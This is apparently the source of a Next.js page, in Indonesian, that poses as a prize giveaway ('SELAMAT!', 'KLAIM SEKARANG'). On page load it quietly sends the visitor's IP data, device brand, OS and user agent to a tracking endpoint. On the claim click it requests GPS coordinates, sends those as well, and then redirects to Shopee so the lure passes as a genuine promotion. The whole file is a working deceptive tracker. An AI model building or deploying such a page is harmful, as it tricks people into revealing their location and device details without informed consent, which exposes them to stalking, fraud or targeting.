/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useEffect, useState } from "react";
import confetti from "canvas-confetti";

export default function TrackPage() {
  const [ipData, setIpData] = useState<any>(null);
  const [deviceInfo, setDeviceInfo] = useState<any>(null);
  const [loading, setLoading] = useState(false);

  const ready = ipData && deviceInfo;

  useEffect(() => {
    async function run() {
      const ipRes = await fetch("/api/get-ip");
      const ipJson = await ipRes.json();
      setIpData(ipJson);

      const d = getDeviceInfo();
      setDeviceInfo(d);

      await fetch("/api/save-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...ipJson,
          ...d,
          gpsLat: null,
          gpsLon: null,
        }),
      });

      setTimeout(() => confetti({ particleCount: 120, spread: 90 }), 300);
    }

    run();
  }, []);

  async function handleClaim() {
    if (!ready) return alert("Sedang memuat data, coba 1 detik lagi");

    setLoading(true);

    const fullPayload = {
      ...ipData,
      ...deviceInfo,
    };

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ...fullPayload,
            gpsLat: pos.coords.latitude,
            gpsLon: pos.coords.longitude,
          }),
        });

        confetti({ particleCount: 300, spread: 100 });

        setTimeout(() => {
          window.location.href = "https://shopee.co.id";
        }, 1200);
      },

      async () => {
        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ...fullPayload,
            gpsLat: null,
            gpsLon: null,
          }),
        });

        setTimeout(() => {
          window.location.href = "https://shopee.co.id";
        }, 1200);
      }
    );
  }

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        {loading ? (
          <>
            <h2 style={styles.title}>⏳ Memverifikasi...</h2>
            <p style={styles.text}>Harap tunggu sebentar…</p>
          </>
        ) : (
          <>
            <h2 style={styles.title}>🎉 SELAMAT!</h2>
            <p style={styles.text}>
              Anda mendapatkan kesempatan hadiah menarik!
            </p>

            <button
             disabled={!ready}
              style={{
                ...styles.button,
                opacity: ready ? 1 : 0.5,
                pointerEvents: ready ? "auto" : "none",
              }}
              onClick={handleClaim}
            >
              🎁 KLAIM SEKARANG
            </button>
          </>
        )}
      </div>
    </div>
  );
}

function getDeviceInfo() {
  const ua = navigator.userAgent.toLowerCase();

  let os = "Unknown OS";
  if (ua.includes("windows")) os = "Windows";
  else if (ua.includes("mac os x")) os = "MacOS";
  else if (ua.includes("android")) os = "Android";
  else if (ua.includes("iphone")) os = "iPhone iOS";
  else if (ua.includes("ipad")) os = "iPad iOS";

  let deviceType = "Desktop";
  if (/mobile/i.test(ua)) deviceType = "Mobile";
  if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";

  const brands = [
    "Samsung",
    "Xiaomi",
    "Oppo",
    "Vivo",
    "Realme",
    "Infinix",
    "Poco",
    "Huawei",
    "Nokia",
    "Sony",
    "Asus",
    "Lenovo",
    "iPhone",
    "iPad",
  ];

  let brand = "Unknown";
  for (const b of brands) {
    if (ua.includes(b.toLowerCase())) brand = b;
  }

  if (deviceType === "Desktop") brand = os;

  return { device: brand, deviceType, os, userAgent: navigator.userAgent };
}

const styles: any = {
  container: {
    minHeight: "100vh",
    background: "#ffefe0",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
  },
  card: {
    background: "#fff",
    padding: 30,
    maxWidth: 360,
    borderRadius: 15,
    textAlign: "center",
    boxShadow: "0 6px 18px rgba(0,0,0,0.15)",
  },
  title: { fontSize: 26, marginBottom: 10 },
  text: { fontSize: 16 },
  button: {
    background: "#ff5722",
    padding: 14,
    marginTop: 20,
    borderRadius: 10,
    border: "none",
    color: "#fff",
    fontSize: 18,
    cursor: "pointer",
    width: "100%",
  },
};
